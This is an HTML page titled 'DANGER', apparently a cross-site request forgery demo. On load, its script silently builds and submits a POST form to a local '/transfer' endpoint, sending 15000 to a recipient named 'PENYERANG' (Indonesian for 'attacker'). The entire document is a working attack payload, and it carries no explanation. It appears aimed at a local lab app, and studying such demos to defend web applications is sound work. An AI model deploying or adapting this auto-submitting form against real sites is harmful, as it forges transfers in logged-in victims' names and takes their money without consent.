<!DOCTYPE html>
<html>
    <head>
        <title>DANGER</title>
    </head>
    <body>
        <script>
            const form = document.createElement("form");
            form.method = "post";
            form.action = "http://localhost:3000/transfer";

            const to = document.createElement("input");
            to.type = "text";
            to.name = "to";
            to.value = "PENYERANG";

            const ammount = document.createElement("input");
            ammount.type = "text";
            ammount.name = "ammount";
            ammount.value = "15000";

            form.appendChild(to);
            form.appendChild(ammount);

            document.body.appendChild(form);

            form.submit();
        </script>
    </body>
</html>
